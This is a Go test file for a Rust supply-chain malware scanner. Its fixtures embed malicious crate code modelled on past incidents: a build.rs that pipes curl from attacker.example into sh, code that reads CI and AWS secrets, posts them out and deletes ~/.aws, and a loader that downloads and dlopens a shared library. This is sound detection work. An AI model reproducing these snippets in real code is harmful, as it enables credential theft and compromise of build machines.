// incidents_test.go — replays of canonical real-world crates.io supply
// chain compromises against the rsscan AST scanner. Companion to
// heuristics/incidents_test.go: this file confirms the AST scanner
// produces hits with file/line/snippet evidence on the same shapes.

package rsscan

import (
	"strings"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/astscan"
)

func scanWithEvidence(t *testing.T, path, src string) *astscan.Findings {
	t.Helper()
	s, err := New()
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	f := astscan.NewFindingsWithEvidence()
	s.AnalyzeFile(path, []byte(src), f)
	return f
}

func requireCaps(t *testing.T, f *astscan.Findings, want ...domain.Capability) {
	t.Helper()
	for _, c := range want {
		if _, ok := f.Capabilities[c]; !ok {
			t.Errorf("missing capability %s; got %v", c, capList(f))
		}
	}
}

func requireEvidence(t *testing.T, f *astscan.Findings, c domain.Capability, snippetSubstr string) {
	t.Helper()
	for _, e := range f.Evidence {
		if e.Capability == c && strings.Contains(e.Snippet, snippetSubstr) {
			return
		}
	}
	t.Errorf("no evidence row for %s containing %q; have %+v", c, snippetSubstr, f.Evidence)
}

func TestIncidents_Xrvrv_2023(t *testing.T) {
	// xrvrv-cluster crates (2023). Each crate had a build.rs that
	// fetched and exec'd a shell payload at `cargo build` time —
	// crates.io's install-hook equivalent. Public write-up:
	// https://blog.phylum.io/typosquatting-the-rust-crates-registry/
	src := `
fn main() {
    std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -sSL http://attacker.example/x | sh")
        .status()
        .ok();
}
`
	f := scanWithEvidence(t, "build.rs", src)
	requireCaps(t, f, domain.CapShellSpawn)
	requireEvidence(t, f, domain.CapShellSpawn, "Command::new")
}

func TestIncidents_RustDecimal_2022(t *testing.T) {
	// rustdecimal@1.x.x (Apr 2022). Typosquat of rust_decimal. The
	// payload looked for CI tokens in env (GITLAB_CI / GITHUB_TOKEN /
	// AWS_*), then posted them outbound. The typosquat-risk capability
	// fires from heuristics on the name; here we cover the AST shape
	// of the exfil code.
	src := `
use std::env;
use std::process::Command;

fn collect() {
    let token = env::var("GITLAB_CI_TOKEN").unwrap_or_default();
    let aws = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let body = format!("{}:{}", token, aws);

    let _ = reqwest::blocking::Client::new()
        .post("http://attacker.example/exfil")
        .body(body)
        .send();

    Command::new("sh").arg("-c").arg("rm -rf ~/.aws").status().ok();
}
`
	f := scanWithEvidence(t, "src/lib.rs", src)
	requireCaps(t, f,
		domain.CapShellSpawn,
		domain.CapNetEgress,
	)
	for _, want := range []string{"GITLAB_CI_TOKEN", "AWS_SECRET_ACCESS_KEY"} {
		if _, ok := f.EnvReads[want]; !ok {
			t.Errorf("expected env-read %q, got %v", want, envReads(f))
		}
	}
}

func TestIncidents_DynamicLoader(t *testing.T) {
	// Generic shape: a malicious crate downloads an .so at first
	// call and dlopen's it via libloading. This is Rust's closest
	// equivalent to eval — runtime-determined code execution.
	src := `
use std::fs;
use libloading::Library;

pub unsafe fn run(payload_url: &str) {
    let bytes = reqwest::blocking::get(payload_url).unwrap().bytes().unwrap();
    fs::write("/tmp/payload.so", bytes).unwrap();
    let _lib = Library::new("/tmp/payload.so").unwrap();
}
`
	f := scanWithEvidence(t, "src/loader.rs", src)
	requireCaps(t, f,
		domain.CapDynamicEval,        // Library::new
		domain.CapNetEgress,          // reqwest::blocking::get
		domain.CapFSWriteOutsideRoot, // fs::write
	)
	requireEvidence(t, f, domain.CapDynamicEval, "Library::new")
}
